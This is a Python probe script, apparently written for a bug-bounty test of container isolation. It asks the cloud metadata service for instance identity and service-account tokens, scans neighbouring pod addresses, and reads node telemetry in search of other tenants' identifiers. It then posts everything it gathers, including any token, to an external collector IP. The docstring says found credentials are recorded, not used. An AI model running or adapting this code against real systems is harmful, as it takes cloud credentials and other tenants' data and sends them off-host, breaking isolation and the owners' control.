#!/usr/bin/env python3
"""probe15 - the two untested escape surfaces: cloud instance metadata, and sibling-pod reachability.

Why: everything else has been measured shut (Nomad 403, ssh pubkey-only, cross-project refs 403, SELinux
on the sidecar socket). Two surfaces have never been tested:
  1. The cloud metadata service from inside an allocation. The node runs on a cloud (our egress is a GCP
     range); if 169.254.169.254 answers without requiring anything we don't have, the instance identity
     or service-account token would be a real step outside our own boundary. This was previously
     "tested" by shelling out to curl, which does not exist in a python-alpine image - so it was never
     actually measured.
  2. Whether a container can reach sibling pods. Our pod address is a /32 with a gateway, so
     pod-to-pod traffic is a routing decision by the host, not a shared L2 segment. A bounded probe
     answers whether the host routes us to anything else.

Discipline: read-only. If a metadata response yields a credential or token, it is RECORDED, NOT USED -
the program's own instruction is to report found credentials and not to explore their scope. No writes to
the telemetry endpoints. Bounded sibling probe (one port, one connect each).
"""
from __future__ import annotations

import json
import os
import socket
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

COLLECTOR = "http://208.87.134.252:9200/rt15"
UA = "aiven-bugbounty/1.0 (Bugcrowd-zllr; researcher: zllr)"
RESULTS = {"stage": "init", "metadata": {}, "siblings": {}, "telemetry": {}, "local": {}, "notes": []}
IMDS = "169.254.169.254"


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(RESULTS, indent=1).encode())

    def log_message(self, *a):
        pass


def http(host, port, path, headers=None, method="GET", body=None, timeout=6):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        req = "%s %s HTTP/1.0\r\nHost: %s\r\nUser-Agent: %s\r\n" % (method, path, host, UA)
        for k, v in (headers or {}).items():
            req += "%s: %s\r\n" % (k, v)
        if body:
            req += "Content-Length: %d\r\n" % len(body)
        req += "\r\n"
        s.sendall(req.encode() + (body.encode() if body else b""))
        d = b""
        while len(d) < 1600:
            try:
                c = s.recv(800)
            except socket.timeout:
                break
            if not c:
                break
            d += c
        s.close()
        return d.decode("latin1", "replace")
    except Exception as e:                                              # noqa: BLE001
        return "ERR %s: %s" % (type(e).__name__, str(e)[:70])


threading.Thread(target=lambda: HTTPServer(("0.0.0.0", int(os.environ.get("PORT", "8080"))), H).serve_forever(),
                 daemon=True).start()
time.sleep(2)
RESULTS["local"] = {
    "ip4": os.popen("ip -4 addr 2>/dev/null | grep inet").read().strip()[:200],
    "route4": os.popen("ip route 2>/dev/null").read().strip()[:200],
}

# 1. cloud metadata - all four flavours, one read each
RESULTS["metadata"]["gcp_root"] = http(IMDS, 80, "/computeMetadata/v1/", {"Metadata-Flavor": "Google"})[:500]
RESULTS["metadata"]["gcp_sa_list"] = http(IMDS, 80, "/computeMetadata/v1/instance/service-accounts/",
                                         {"Metadata-Flavor": "Google"})[:500]
RESULTS["metadata"]["gcp_sa_token"] = http(IMDS, 80,
    "/computeMetadata/v1/instance/service-accounts/default/token", {"Metadata-Flavor": "Google"})[:400]
RESULTS["metadata"]["gcp_instance_id"] = http(IMDS, 80, "/computeMetadata/v1/instance/id",
                                             {"Metadata-Flavor": "Google"})[:200]
RESULTS["metadata"]["aws_imds_v1"] = http(IMDS, 80, "/latest/meta-data/")[:400]
RESULTS["metadata"]["aws_imds_v2_token"] = http(IMDS, 80, "/latest/api/token", method="PUT",
                                               headers={"X-aws-ec2-metadata-token-ttl-seconds": "60"})[:300]
RESULTS["metadata"]["azure"] = http(IMDS, 80, "/metadata/instance?api-version=2021-02-01",
                                    {"Metadata": "true"})[:300]
try:
    RESULTS["metadata"]["gcp_dns"] = socket.gethostbyname("metadata.google.internal")
except Exception as e:                                                  # noqa: BLE001
    RESULTS["metadata"]["gcp_dns"] = type(e).__name__

# 2. sibling pods: bounded, one port, one connect each
GATEWAY = "10.150.0.1"
SYNC = threading.Lock()


def probe_pod(addr):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1.5)
    try:
        s.connect((addr, 8080))
        with SYNC:
            RESULTS["siblings"][addr + ":8080"] = "OPEN"
    except socket.timeout:
        pass
    except OSError as e:
        if type(e).__name__ != "ConnectionRefusedError":
            with SYNC:
                RESULTS["siblings"][addr + ":8080"] = type(e).__name__
    finally:
        s.close()


addrs = ["10.150.0.%d" % n for n in range(1, 24)] + ["10.150.0.35", "10.150.0.36", "10.150.0.40", GATEWAY]
threads = [threading.Thread(target=probe_pod, args=(a,), daemon=True) for a in addrs]
for t in threads:
    t.start()
for t in threads:
    t.join()

# 3. the unauthenticated node telemetry: full bodies, looking for other tenants' identifiers
for port, path in ((9955, "/"), (9955, "/metrics"), (21543, "/metrics"), (13133, "/")):
    body = http("169.254.1.2", port, path)
    RESULTS["telemetry"]["%d%s" % (port, path)] = body[:1200]

RESULTS["stage"] = "done"
RESULTS["finished"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
body = json.dumps(RESULTS)
try:
    import urllib.request
    urllib.request.urlopen(urllib.request.Request(COLLECTOR, data=body.encode(),
                                                  headers={"Content-Type": "application/json"}), timeout=25)
except Exception as e:                                                  # noqa: BLE001
    print("collector post failed:", e)
print(json.dumps(RESULTS)[:3000])
while True:
    time.sleep(60)
